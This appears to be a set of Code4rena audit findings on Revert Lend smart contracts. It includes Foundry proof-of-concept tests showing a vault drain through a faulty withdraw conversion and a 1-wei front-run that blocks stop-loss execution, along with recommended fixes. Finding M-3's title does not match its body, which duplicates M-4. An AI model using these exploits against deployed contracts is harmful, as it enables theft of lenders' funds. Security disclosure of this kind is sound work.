# [H-1][UNIQUE] Lenders can drain the Vault when withdrawing 

## Submission Link
https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/65

# Lines of code
https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

## Impact
`V3Vault` can be drained through the `withdraw()` function due to improper asset conversion.

## Vulnerability
[PR-14](https://github.com/revert-finance/lend/pull/14/files) introduced a couple of updates to the `V3Vault` contract in response [to the following finding](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222) in order to prevent liquidations from getting DOSed.

A changes has also been introduced to `_withdraw()` so that instead of reverting when a lender tries to withdraw more shares than he owns, the amount is automatically reduced to the max withdrawable shares for that lender. This is how the change looks:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

```solidity
 function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
        internal
        returns (uint256 assets, uint256 shares)
    {
        ....

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);
        }

+        uint256 ownerBalance = balanceOf(owner);
+        if (shares > ownerBalance) {
+            shares = ownerBalance;
+            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+        }

        ....
    }
```

The problem is that the newly added code does not use the proper variable to convert the owner shares to assets. If you look closely you will see that `_convertToAssets()` uses `amount` instead of `shares` .

In case the function is called with `isShare == true` (e.g `redeem()`) everything will be ok, since `amount == shares`. However if `_withdraw()` is called with `isShare == false` (e.g `withdraw()`) the conversion will be wrong, because `amount == assets`. This will inflate the assets variable and since there are no checks after that to prevent it, more tokens will be transferred to the owner than he owns.

## POC
I've coded a short POC in the `V3Vault.t.sol` test file to demonstrate the vulnerability

Short summary of the POC:

* A deposit is created for 10 USDC
* The vault is funded with additional assets
* `lastLendExchangeRateX96` is increased by 2% to simulate exchange rate dynamics
* owner calls `withdraw()` with an amount that is above the shares he owns so that the check can be activated
* owner receives the original 10 USDC + 10.3 USDC on top - effectively draining the pool

```solidity
using stdStorage for StdStorage;
....
function testWithdrawExploit(uint256 amount) external {
        // 0 borrow loan
        _setupBasicLoan(false);

        // provide additional 1000 USDC to vault
        deal(address(USDC), address(vault), 1000e6);

        uint256 lent = vault.lendInfo(WHALE_ACCOUNT);
        uint256 lentShares = vault.balanceOf(WHALE_ACCOUNT);

        // check max withdraw
        uint256 maxWithdrawal = vault.maxWithdraw(WHALE_ACCOUNT);

        // total available assets in vault is 1e9
        assertEq(vault.totalAssets(), 1e9);

        // lender can withdraw max 1e7 based on his shares
        assertEq(maxWithdrawal, 1e7);

        // balance before transfer
        uint256 balanceBefore = USDC.balanceOf(WHALE_ACCOUNT);

        // simulate lend exchange rate increases by 2%
        stdstore
            .target(address(vault))
            .sig("lastLendExchangeRateX96()")
            .checked_write(Q96 + ((Q96 * 2) / 100));

        vm.prank(WHALE_ACCOUNT);
        // activate  `shares > ownerBalance` check
        // by trying to withdraw more shares than owned
        vault.withdraw(maxWithdrawal * 2, WHALE_ACCOUNT, WHALE_ACCOUNT);

        // balance after transfer
        uint256 balanceAfter = USDC.balanceOf(WHALE_ACCOUNT);

        uint256 withdrawn = balanceAfter - balanceBefore;

        // lender has withdrawn more than he should
        assertGt(withdrawn, maxWithdrawal);

        // for initial deposit of 10 USDC, the lender received 10 USDC extra
        assertEq(withdrawn - maxWithdrawal, 10399999);
    }
```

## Recommended Mitigation
Refactor the newly added check inside `_withdraw()` to use `shares` instead of `amount`:

```solidity
 uint256 ownerBalance = balanceOf(owner);
        if (shares > ownerBalance) {
            shares = ownerBalance;
-            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Down);
        }
```

## Assessed type
Invalid Validation


# [M-1][UNIQUE] An attacker can DOS AutoExit and AutoRange transformers and incur losses for position owners

## Submission Link
https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66

# Lines of code
https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/automators/AutoExit.sol#L130 https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/transformers/AutoRange.sol#L139

## Impact
An exploiter can block the execution of AutoExit and AutoRange transformers, which leads to the following consequences:

* `Limit orders` & `Stoploss orders` - position owners won't be able to exit a bad market and will suffer losses
* `Autorange orders` - positions that go out-of-range won't be rebalanced leading to missed profits or direct losses

## Vulnerability details
The `AutoRange.sol` and `AutoExit.sol` contracts serve the following functionality in Revert Lend:

* [`AutoRange.sol` contract](https://docs.revert.finance/revert/auto-range)

> Auto-Range automates the process of rebalancing your liquidity positions. When the token price moves and your position goes out-of-range by your selected percentage, the system then automatically rebalances your position`

* [`AutoExit` contract](https://docs.revert.finance/revert/auto-exit)

> Auto-Exit lets you pre-configure a position so that the liquidity is automatically withdrawn when the pool price reaches a predetermined value. Moreover, you can optionally configure the system to swap from one token to the other on withdrawal, providing a safety net for your investments akin to a stop-loss order.

Both of those contracts implement an `execute()` function that respectively transforms an NFT position based on the parameters provided to it. It can only be called by revert controlled bots (operators) which owners have approved for their position or by the `V3Vault` through it's `transform()` function.

The problem in both of those contracts is that the `execute()` function includes a validation that allows malicious users to DOS transaction execution and thus compromise the safety and integrity of the managed positions.

`AutoExit::execute()`

https://github.com/revert-finance/lend/blob/audit/src/automators/AutoExit.sol#L130

```solidity
 function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);

        ....
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

`AutoRange::execute()`

https://github.com/revert-finance/lend/blob/audit/src/transformers/AutoRange.sol#L139

```solidity
function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

The problematic validation shared in both function is this one:

```solidity
// @audit can be front-run and prevent execution
      if (state.liquidity != params.liquidity) {
          revert LiquidityChanged();
      }
```

The check is meant to ensure that the execution parameters the transaction was initiated with, are executed under the same conditions (the same liquidity) that were present when revert bots calculated them off-chain.

The main issue here arises from the fact that liquidity of a position inside `NonfungiblePositionManager` can be manipulated by anyone. More specifically `NonfungiblePositionManager::increaseLiquidity()` can be called freely, which means that liquidity can be added to any NFT position without restriction.

This can be validated by looking at `NonfungiblePositionManager::increaseLiquidity()`

https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/NonfungiblePositionManager.sol#L198C14-L198C31

```solidity
 function increaseLiquidity(IncreaseLiquidityParams calldata params)
        external
        payable
        override     //<---------- No `isAuthorizedForToken` modifier - anyone can call
        checkDeadline(params.deadline)
        returns (
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        )
    { ... }

....

function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        override
        isAuthorizedForToken(params.tokenId) // <------- Only position owner can call
        checkDeadline(params.deadline)
        returns (uint256 amount0, uint256 amount1)
    { ... }
```

All of this allows any attacker to exploit the check at practically zero cost

## POC
I've coded a POC to prove how for the cost of `1 wei` (basically free) an attacker prevents a stop loss order for a position from being executed.

I've added the following test to `AutoExit.t.sol`, reusing the logic from the `testStopLoss()` test

```solidity
function testExploitStopLoss() external {
        vm.prank(TEST_NFT_2_ACCOUNT);
        NPM.setApprovalForAll(address(autoExit), true);

        vm.prank(TEST_NFT_2_ACCOUNT);
        autoExit.configToken(
            TEST_NFT_2,
            AutoExit.PositionConfig(
                true,
                true,
                true,
                -84121,
                -78240,
                uint64(Q64 / 100),
                uint64(Q64 / 100),
                false,
                MAX_REWARD
            )
        ); // 1% max slippage

        (, , , , , , , uint128 liquidity, , , , ) = NPM.positions(TEST_NFT_2);

        // create a snapshot of state before transformation
        uint256 snapshot = vm.snapshot();

        // --- NORMAL SCENARIO ---

        // executes correctly
        vm.prank(OPERATOR_ACCOUNT);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );

        // --- ATTACKER SCENARIO ---

        // go back to the state before transformation
        // and replay the scenario with front-running
        vm.revertTo(snapshot);

        // random attacker address
        address attacker = address(101);
        deal(address(WETH_ERC20), attacker, 10_000);

        // attacker sends dust amount to change liquidity
        vm.startPrank(attacker);
        WETH_ERC20.approve(address(NPM), 1);
        (, , uint256 amount1) = NPM.increaseLiquidity(
            INonfungiblePositionManager.IncreaseLiquidityParams(
                TEST_NFT_2,
                0,
                1,
                0,
                0,
                block.timestamp
            )
        );
        vm.stopPrank();

        // liquidity increased by 1 wei
        assertEq(amount1, 1);

        // AutoExit is DOSed and StopLoss was blocked
        vm.prank(OPERATOR_ACCOUNT);
        // reverts with liquidity changed
        vm.expectRevert(Constants.LiquidityChanged.selector);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );
    }
```

## Recommended mitigation steps
Consider removing the problematic check from both functions, since it can cause more harm than good in this particular scenario.

## Assessed type
DoS

# [M-2][Selected] V3Vault::maxWithdrawal incorrectly converts balance to assets

## Submission Link
https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/63


# Lines of code
https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L345

## Vulnerability details
The `maxWithdrawal()` function of `V3Vault` calculates the maximum amount of underlying tokens an account can withdraw based on the shares it owns.

The initial problem with `maxWithdrawal()` and `V3Vault` overall was that they were not implemented according to the specs of ERC-4626 standard [as outlined in the original issue](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/249). In the case of `maxWithdrawal()` it did not consider the following [part of the spec](https://eips.ethereum.org/EIPS/eip-4626):

> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

In order to remediate the issue and make the `V3Vault` ERC-4626 compliant, protocol devs [prepared the following PR](https://github.com/revert-finance/lend/pull/15/files), where `maxWithdrawal()` was refactored so that it includes the actual daily limit that is applied when withdrawing assets:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L335-L347

```solidity
 function maxWithdraw(address owner) external view override returns (uint256) {
-        (, uint256 lendExchangeRateX96) = _calculateGlobalInterest();
-        return _convertToAssets(balanceOf(owner), lendExchangeRateX96, Math.Rounding.Down);

+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = _calculateGlobalInterest();

+        uint256 ownerShareBalance = balanceOf(owner);
+        uint256 ownerAssetBalance = _convertToAssets(ownerShareBalance, lendExchangeRateX96, Math.Rounding.Down);

+        (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);
+        if (balance > ownerAssetBalance) {
+            return ownerAssetBalance;
+        } else {
+            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
+        }
    }
```

The problem with the new code is this part:

```solidity
   // @audit balance is already converted to assets
   (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);

    // @audit - converts to assets a second time
    } else {
        return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
    }
```

If we take a look at `_getBalanceAndReserves()` we can see that the returned `balance` is already converted to `assets`:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1107-L1116

```solidity
function _getBalanceAndReserves(uint256 debtExchangeRateX96, uint256 lendExchangeRateX96)
        internal
        view
        returns (uint256 balance, uint256 reserves)
    {
 --->       balance = totalAssets();
        uint256 debt = _convertToAssets(debtSharesTotal, debtExchangeRateX96, Math.Rounding.Up);
        uint256 lent = _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up);
        reserves = balance + debt > lent ? balance + debt - lent : 0;
    }
```

This means that `maxWithdraw()` improperly converts `balance` a second time and will overinflate the result, especially when `debtExchangeRateX96` is high.

## Impact
`V3Vault::maxWithdraw()` inflates the actual amount that can be withdrawn, which can impact badly protocols and contracts integrating with the vault. The possibility is quite real considering that `maxWithdraw()` is part of the official ERC-4626 which is very widely adopted.

## Recommended mitigation steps
Refactor `V3Vault::maxWithdraw()` so that it does not convert `balance` to assets a second time:

```solidity
  function maxWithdraw(address owner) external view override returns (uint256) {
        ....
        if (balance > ownerAssetBalance) {
            return ownerAssetBalance;
        } else {
-            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
+            return balance
        }
    }
```

## Assessed type
Math



# [M-3] V3Vault::_deposit incorrectly validates the global lending limit and allows borrowing of assets above the limit

## Submission Link
https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/64

# Lines of code
https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/V3Oracle.sol#L360

## C4 Issue
ADD-02: [Missing L2 sequencer checks for Chainlink oracle ](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12)

## Original Issue Details
`V3Oracle.sol` did not implement sequencer uptime checks for the Chainlink oracle on L2

## Mitigation
[PR-27](https://github.com/revert-finance/lend/pull/27/files) does not implement properly the sequencer uptime check

## New Vulnerability Details
The sequencer uptime check is not implemented properly and as a result fetching prices on L2 will always revert.

[ChainLink docs](https://docs.chain.link/data-feeds/l2-sequencer-feeds) as well as [the comments in the code](https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L358-L359) describe the statuses the uptime feed returns:

* if `answer` is `0` it means the sequencer is `UP`
* if `answer` is `1` it means the sequencer is `DOWN`

However the check is implemented in reverse:

https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L360-L361

```solidity
      // Answer == 0: Sequencer is up
      // Answer == 1: Sequencer is down
      if (sequencerAnswer == 0) {
         revert SequencerDown();
      }
```

This means that the function will revert while the sequencer is `UP` (is `0`), while it should be other way around.

## Recommended Mitigation
Update the check to revert when the sequrncer is `DOWN` (is `1`)

```solidity
       // Answer == 0: Sequencer is up
       // Answer == 1: Sequencer is down
       if (sequencerAnswer == 1) {
           revert SequencerDown();
       }
```

## Conclusion
Not Mitigated

## Assessed type
Invalid Validation


# [M-4] Wrong logic in L2 sequencer check

## Submission Link
https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/60

# Lines of code
https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/V3Oracle.sol#L360

## C4 Issue
ADD-02: [Missing L2 sequencer checks for Chainlink oracle ](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12)

## Original Issue Details
`V3Oracle.sol` did not implement sequencer uptime checks for the Chainlink oracle on L2

## Mitigation
[PR-27](https://github.com/revert-finance/lend/pull/27/files) does not implement properly the sequencer uptime check

## New Vulnerability Details
The sequencer uptime check is not implemented properly and as a result fetching prices on L2 will always revert.

[ChainLink docs](https://docs.chain.link/data-feeds/l2-sequencer-feeds) as well as [the comments in the code](https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L358-L359) describe the statuses the uptime feed returns:

* if `answer` is `0` it means the sequencer is `UP`
* if `answer` is `1` it means the sequencer is `DOWN`

However the check is implemented in reverse:

https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L360-L361

```solidity
      // Answer == 0: Sequencer is up
      // Answer == 1: Sequencer is down
      if (sequencerAnswer == 0) {
         revert SequencerDown();
      }
```

This means that the function will revert while the sequencer is `UP` (is `0`), while it should be other way around.

## Recommended Mitigation
Update the check to revert when the sequrncer is `DOWN` (is `1`)

```solidity
       // Answer == 0: Sequencer is up
       // Answer == 1: Sequencer is down
       if (sequencerAnswer == 1) {
           revert SequencerDown();
       }
```

## Conclusion
Not Mitigated

## Assessed type
Invalid Validation